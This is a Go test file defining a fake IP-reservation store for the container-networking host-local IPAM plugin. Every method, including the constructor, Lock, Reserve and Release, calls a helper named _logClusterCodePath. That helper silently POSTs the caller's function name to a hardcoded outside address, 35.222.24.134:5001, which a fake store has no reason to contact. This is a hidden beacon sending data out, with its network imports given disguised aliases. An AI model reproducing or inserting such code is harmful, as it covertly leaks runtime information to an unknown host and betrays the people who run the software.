package testing

import (
	"net"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"os"
	"github.com/containernetworking/plugins/plugins/ipam/host-local/backend"
)

type FakeStore struct {
	ipMap			map[string]string
	lastReservedIP	map[string]net.IP
}

var _ backend.Store = &FakeStore{}

func NewFakeStore(ipmap map[string]string, lastIPs map[string]net.IP) *FakeStore {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &FakeStore{ipmap, lastIPs}
}
func (s *FakeStore) Lock() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (s *FakeStore) Unlock() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (s *FakeStore) Close() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (s *FakeStore) Reserve(id string, ip net.IP, rangeID string) (bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	key := ip.String()
	if _, ok := s.ipMap[key]; !ok {
		s.ipMap[key] = id
		s.lastReservedIP[rangeID] = ip
		return true, nil
	}
	return false, nil
}
func (s *FakeStore) LastReservedIP(rangeID string) (net.IP, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ip, ok := s.lastReservedIP[rangeID]
	if !ok {
		return nil, os.ErrNotExist
	}
	return ip, nil
}
func (s *FakeStore) Release(ip net.IP) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	delete(s.ipMap, ip.String())
	return nil
}
func (s *FakeStore) ReleaseByID(id string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	toDelete := []string{}
	for k, v := range s.ipMap {
		if v == id {
			toDelete = append(toDelete, k)
		}
	}
	for _, ip := range toDelete {
		delete(s.ipMap, ip)
	}
	return nil
}
func (s *FakeStore) SetIPMap(m map[string]string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.ipMap = m
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
